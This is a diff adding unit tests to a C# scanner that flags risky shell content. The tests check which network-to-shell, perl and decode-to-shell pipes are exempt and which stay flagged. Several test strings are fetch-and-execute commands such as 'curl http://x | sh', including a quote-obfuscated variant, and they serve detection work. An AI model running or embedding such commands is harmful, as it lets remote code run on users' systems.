@@ -161,6 +161,80 @@ public class ShellContentScannerTests
         AssertHasFinding(content, "network-execution", FindingSeverity.High);
     }
 
+    [TestCase("echo \"    curl -fsSL https://example.com/uninstall.sh | bash -s -- --purge --yes\"",
+        Description = "uninstall help text in an echo")]
+    [TestCase("echo \"Script: curl -fsSL https://example.com/install | bash\"",
+        Description = "displayed command note")]
+    [TestCase("'foo-bin: Foo CLI (alternatively install upstream: curl -fsSL https://example.com/install.sh | sh -s -- -v)'",
+        Description = "optdepends-style note in a single-quoted string")]
+    [TestCase("echo \"Usage: $0 {g|sh|ag} [-c|--clear]\"",
+        Description = "usage string containing a literal pipe into 'sh'")]
+    public void Network_rules_ignore_quoted_display_text(string content)
+    {
+        var findings = Scan(content);
+        Assert.That(
+            findings.Any(f => f.RuleId is "network-to-shell" or "network-execution" or "decode-to-shell"),
+            Is.False,
+            $"Unexpected network rule finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Network_pipe_inside_quoted_command_substitution_stays_flagged()
+    {
+        // A substitution inside double quotes still executes: only display-text pipes
+        // are suppressed.
+        AssertHasFinding("echo \"$(curl http://x | sh)\"", "network-to-shell", FindingSeverity.Critical);
+    }
+
+    [TestCase("curl -s https://github.com/org/repo/releases/latest | perl -pe 's!.*/tag/v?([0-9].+)!!'",
+        Description = "release-tag scraping with a -pe line filter")]
+    [TestCase("_source=$(curl -s \"$url\" | perl -n -e 's/x/y/ && print')",
+        Description = "HTML scraping with -n and separate -e")]
+    [TestCase("curl http://x | perl -wne 'print if /v/'",
+        Description = "switch cluster containing e")]
+    public void Network_execution_ignores_perl_inline_text_filters(string content)
+    {
+        var findings = Scan(content);
+        Assert.That(findings.Any(f => f.RuleId == "network-execution"), Is.False,
+            $"Unexpected network-execution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [TestCase("curl http://x | perl", Description = "bare perl executes stdin")]
+    [TestCase("curl http://x | perl -", Description = "lone dash reads the program from stdin")]
+    [TestCase("curl http://x | perl -MFile::Spec", Description = "module flag provides no program source")]
+    [TestCase("curl http://x | perl -p", Description = "-p without -e or a file still reads stdin")]
+    public void Network_execution_still_flags_perl_without_inline_program(string content)
+    {
+        AssertHasFinding(content, "network-execution", FindingSeverity.High);
+    }
+
+    [Test]
+    public void Obfuscated_network_execution_into_perl_filter_stays_critical()
+    {
+        // The perl-filter exemption applies to plainly visible constructs only; hiding the
+        // tool names keeps the obfuscation escalation.
+        var finding = SingleFinding("c''url http://x | p''erl -pe 's/a/b/'", "network-execution");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
+    }
+
+    [TestCase("echo yes | bash build_foo --console")]
+    [TestCase("echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null")]
+    [TestCase("printf '%s\\n' 'yes' ${prefix} | bash \"${srcdir}/installer\" | tee")]
+    [TestCase("echo y | sh /opt/installer.sh")]
+    public void Decode_to_shell_ignores_answer_feeding_into_local_scripts(string content)
+    {
+        var findings = Scan(content);
+        Assert.That(findings.Any(f => f.RuleId == "decode-to-shell"), Is.False,
+            $"Unexpected decode-to-shell finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [TestCase("echo 'aGVsbG8=' | bash", Description = "bare shell reads the pipe as its script")]
+    [TestCase("echo x | bash -s -- -y", Description = "-s reads commands from stdin")]
+    public void Decode_to_shell_still_flags_stdin_execution(string content)
+    {
+        AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
+    }
+
     [TestCase("sudo cmd", "sudo")]
     [TestCase("sudoedit /etc/sudoers", "sudoedit")]
     [TestCase("doas cmd", "doas")]
